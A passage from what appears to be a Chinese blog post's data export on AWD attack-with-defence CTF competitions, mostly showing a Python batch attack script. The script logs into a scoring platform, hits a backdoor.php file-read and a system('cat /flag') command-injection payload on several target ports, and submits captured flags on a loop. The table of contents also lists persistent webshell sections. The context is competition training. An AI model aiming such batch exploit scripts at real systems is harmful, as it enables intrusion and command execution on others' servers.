#FFCB6B\">session</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests.Session</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">targets</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> [</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">11515,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">11981</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">11349</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">11982</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">11316</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">11160</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">]</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 提取 flag</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">regexp_out</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">data</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">patterns</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> [</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">re.compile(r</span><span style=\"color: #FFCB6B\">&#39;(flag&#123;.*?&#125;)&#39;</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">re.compile(r</span><span style=\"color: #FFCB6B\">&#39;xnuca&#123;(.*?)&#125;&#39;</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">re.compile(r</span><span style=\"color: #FFCB6B\">&#39;DASCTF&#123;(.*?)&#125;&#39;</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">re.compile(r</span><span style=\"color: #FFCB6B\">&#39;WMCTF&#123;.*?&#125;&#39;</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">re.compile(r</span><span style=\"color: #FFCB6B\">&#39;[0-9a-zA-Z]&#123;8&#125;-[0-9a-zA-Z]&#123;3&#125;-[0-9a-zA-Z]&#123;5&#125;&#39;</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    ]</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> pattern </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> patterns:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">res</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">pattern.findall</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">data.decode</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #BABED8\"> if isinstance</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">data,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">bytes</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">else</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">data</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">len(res</span><span style=\"color: #BABED8\">) </span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> 0:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">res[0]</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">None</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 提交函数</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">submit</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">target_url,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">flag</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">data</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">&quot;challenge_id&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">id</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">&quot;submission&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">flag,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">session.post</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">submit_url,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">json=data,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">allow_redirects=False</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">response</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">json.loads</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">r.text</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\">(</span><span style=\"color: #FFCB6B\">&quot;target: %s - %s - %s \\n&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">%</span><span style=\"color: #BABED8\"> (target_url, </span><span style=\"color: #C3E88D\">flag,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">response[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">data</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">][</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">message</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">]</span><span style=\"color: #BABED8\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">response[</span><span style=\"color: #FFCB6B\">&#39;data&#39;</span><span style=\"color: #FFCB6B\">][</span><span style=\"color: #FFCB6B\">&#39;message&#39;</span><span style=\"color: #FFCB6B\">]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">Correct</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">or</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">response[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">data</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">][</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">message</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">Do not submit again :(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">True</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    else:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">False</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 登录平台</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">login</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">login_url</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">f</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#123;host&#125;/login</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">session.get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">login_url</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">nonce</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">re.findall</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #FFCB6B\">&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.text</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">[</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">r.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    data = </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">&quot;name&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">username,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">&quot;password&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">password,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">&quot;nonce&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">nonce</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">session.post</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">login_url,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">data=data,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">allow_redirects=False</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">text</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.text</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">status_code</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.status_code</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">r.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    if &#39;Your username or password is incorrect&#39; not in text and status_code == 302:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        # 获取平台的 CSRF 令牌</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        r = session.get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #FFCB6B\">&quot;&#123;host&#125;/challenges&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">nonce</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">re.findall</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #FFCB6B\">&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.text</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">[</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">r.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        session.headers[&#39;CSRF-Token&#39;] = nonce</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&quot;Login Success!&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">True</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\">(</span><span style=\"color: #FFCB6B\">&quot;Login Failed!&quot;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">False</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">pwn1</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">target_url</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests.get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #FFCB6B\">&quot;&#123;target_url&#125;/backdoor.php&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">params=&#123;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">file</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/flag</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">&#125;,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">allow_redirects=False</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">text</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.text</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">r.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    return submit</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">target_url,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">regexp_out</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">text</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">pwn2</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">target_url</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">r</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests.get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #FFCB6B\">&quot;&#123;target_url&#125;/admin/views/update.php;&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">params=&#123;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">system(&#39;cat /flag&#39;)</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#125;,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">allow_redirects=False</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">text</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r.text</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">r.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    return submit</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">target_url,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">regexp_out</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">text</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">main</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># 登录平台</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">login</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">return</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">while</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">True:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> target_port </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> targets:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">target_url</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">target_host</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">%</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">target_port</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #676E95; font-style: italic\"># 遍历不同的 payload</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">pwn1(target_url</span><span style=\"color: #BABED8\">): </span><span style=\"color: #89DDFF; font-style: italic\">continue</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">pwn2(target_url</span><span style=\"color: #BABED8\">): </span><span style=\"color: #89DDFF; font-style: italic\">continue</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># 120秒跑一次 auto exp</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        time.sleep</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">120</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">__name__</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">__main__</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">main</span><span style=\"color: #89DDFF\">()</span></span></code></pre></div>","feature":true,"text":"AWDAWD最主要的就是手速！！！ 同时队伍分配一定要合理，密码一定第一时间改掉，修改完配置文件一定记得重启使之生效。 连接SSHshellssh-copy-i...","permalink":"/post/AWD","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"AWD","slug":"AWD","count":1,"path":"api/categories/AWD.json"}],"tags":[{"name":"AWD","slug":"AWD","count":1,"path":"api/tags/AWD.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#AWD\"><span class=\"toc-text\">AWD</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BF%9E%E6%8E%A5SSH\"><span class=\"toc-text\">连接SSH</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%B9%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">改密码</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B\"><span class=\"toc-text\">查看进程</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9D%80%E6%AD%BB%E8%BF%9B%E7%A8%8B\"><span class=\"toc-text\">杀死进程</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">扫描端口</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7\"><span class=\"toc-text\">流量监控</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99\"><span class=\"toc-text\">备份网站</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">备份数据库</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#find%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">find命令</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97\"><span class=\"toc-text\">开启日志</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-ini\"><span class=\"toc-text\">php.ini</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">PHP读取函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">文件包含修复</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Redis%E6%9C%AA%E6%8E%88%E6%9D%83\"><span class=\"toc-text\">Redis未授权</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%B9%E9%87%8FSSH%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">批量SSH链接</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%B9%E9%87%8F%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">批量攻击脚本</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E6%AD%BB%E9%A9%AC\"><span class=\"toc-text\">不死马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E4%B8%8D%E6%AD%BB%E9%A9%AC\"><span class=\"toc-text\">删除不死马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WAF\"><span class=\"toc-text\">WAF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%80%9A%E5%B8%B8WAF\"><span class=\"toc-text\">通常WAF</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7\"><span class=\"toc-text\">文件监控</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4flag\"><span class=\"toc-text\">自动提交flag</span></a></li></ol></li></ol></li></ol>","author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"HNCTF-Crypto","uid":"d860456be5f63fa9cfc13cf6900001a3","slug":"HNCTF题解-Crypto","date":"2023-03-14T18:56:36.000Z","updated":"2023-11-06T05:38:40.295Z","comments":true,"path":"api/articles/HNCTF题解-Crypto.json","keywords":null,"cover":"https://cover.png","text":"[Week1]baBAbaseSEsebase全家桶，base92，91，85，64，32，16 flag为NSSCTF{th3re_1s_als0_b4se_...","permalink":"/post/HNCTF题解-Crypto","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"19 